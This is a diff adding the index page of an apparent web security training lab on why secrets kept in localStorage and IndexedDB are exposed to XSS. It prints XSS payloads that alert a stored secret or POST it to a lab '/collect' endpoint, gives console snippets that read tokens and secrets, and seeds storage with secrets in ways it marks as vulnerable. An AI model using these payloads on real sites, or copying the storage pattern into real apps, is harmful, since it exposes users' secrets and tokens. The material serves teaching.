@@ -1,0 +1,107 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>HTML5 Storage Lab — Index</title>
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; max-width: 900px; margin: 2rem auto; line-height: 1.5; }
+    code, pre { background: #f5f5f5; padding: .2rem .4rem; border-radius: 4px; }
+    .btn { padding: .5rem .8rem; margin-right: .5rem; border: 1px solid #ccc; border-radius: 8px; cursor: pointer; background: #fafafa; }
+    .note { background: #fff7e6; border: 1px solid #ffe8b3; padding: .75rem; border-radius: 8px; }
+  </style>
+</head>
+<body>
+  <h1>HTML5 Web Storage Lab</h1>
+
+  <p>This lab demonstrates how sensitive data in <b>localStorage</b> and <b>IndexedDB</b> can be read by any same-origin script (e.g., XSS).</p>
+
+  <h2>Seed data</h2>
+  <p>
+    <button class="btn" onclick="login('john')">Login as john (low)</button>
+    <button class="btn" onclick="loginMedium('john')">Login as john (medium - hashed secret)</button>
+    <button class="btn" onclick="wipe()">Wipe storage</button>
+  </p>
+
+  <div class="note">
+    <p>Next, check the vulnerable reflected XSS page: <a href="vuln.html?q=Hello">vuln.html</a>.</p>
+    <p>Example XSS payload (will alert the secret):<br>
+      <code>&lt;script&gt;alert(localStorage.getItem('secret'))&lt;/script&gt;</code>
+    </p>
+    <p>Exfil to lab collector:<br>
+      <code>&lt;script&gt;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({s:localStorage.getItem('secret')})})&lt;/script&gt;</code>
+    </p>
+  </div>
+
+  <h2>Call protected API using token from localStorage</h2>
+  <pre><code>fetch('/getflag', {
+  headers: { Authorization: 'Bearer ' + localStorage.getItem('auth_token') }
+}).then(r =&gt; r.json()).then(console.log)</code></pre>
+
+  <h2>IndexedDB (profiles store)</h2>
+  <p>On login, a record is written to IndexedDB <code>labdb</code>, object store <code>profiles</code> with fields <code>{id, secret}</code>.</p>
+  <p>Console snippet to enumerate:</p>
+  <pre><code>let req=indexedDB.open('labdb');
+req.onsuccess=e=&gt;{
+  let db=e.target.result;
+  db.transaction('profiles').objectStore('profiles').getAll().onsuccess =
+    ev =&gt; console.log(ev.target.result);
+};</code></pre>
+
+  <script>
+    // --- IndexedDB helpers ---
+    function openDB(cb) {
+      const req = indexedDB.open('labdb', 1);
+      req.onupgradeneeded = e => {
+        const db = e.target.result;
+        if (!db.objectStoreNames.contains('profiles')) {
+          db.createObjectStore('profiles', { keyPath: 'id' });
+        }
+      };
+      req.onsuccess = e => cb(e.target.result);
+      req.onerror = e => console.error('IDB error', e);
+    }
+
+    function putProfile(id, secret) {
+      openDB(db => {
+        const tx = db.transaction('profiles', 'readwrite');
+        tx.objectStore('profiles').put({ id, secret });
+        tx.oncomplete = () => console.log('IndexedDB: stored profile for', id);
+      });
+    }
+
+    // --- Login flows ---
+    function login(user) {
+      localStorage.setItem('auth_token', 'LAB-TOKEN-' + user + '-12345');
+      localStorage.setItem('secret', 'SUPER-SECRET-' + user + '-PLAIN'); // vulnerable
+      putProfile(user, 'IDB-SECRET-' + user + '-PLAIN'); // vulnerable
+      alert('Logged in as ' + user + ' (low). Storage + IndexedDB seeded.');
+    }
+
+    async function loginMedium(user) {
+      localStorage.setItem('auth_token', 'LAB-TOKEN-' + user + '-hash-12345');
+      // hash the "secret" client-side (still retrievable if JS can read storage)
+      const encoder = new TextEncoder();
+      const data = encoder.encode('SUPER-SECRET-' + user + '-HASHED');
+      const hashBuf = await crypto.subtle.digest('SHA-1', data);
+      const hashArray = Array.from(new Uint8Array(hashBuf));
+      const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+      localStorage.setItem('secret', hashHex);
+      // IndexedDB hashed variant
+      const idbHashBuf = await crypto.subtle.digest('SHA-256', encoder.encode('IDB-SECRET-' + user + '-HASHED'));
+      const idbHashHex = Array.from(new Uint8Array(idbHashBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
+      putProfile(user, idbHashHex);
+      alert('Logged in as ' + user + ' (medium). localStorage.secret = SHA1; IndexedDB.secret = SHA256.');
+    }
+
+    function wipe() {
+      localStorage.clear();
+      sessionStorage.clear();
+      openDB(db => {
+        const tx = db.transaction('profiles', 'readwrite');
+        tx.objectStore('profiles').clear();
+      });
+      alert('Cleared localStorage, sessionStorage, and IndexedDB.');
+    }
+  </script>
+</body>
+</html>
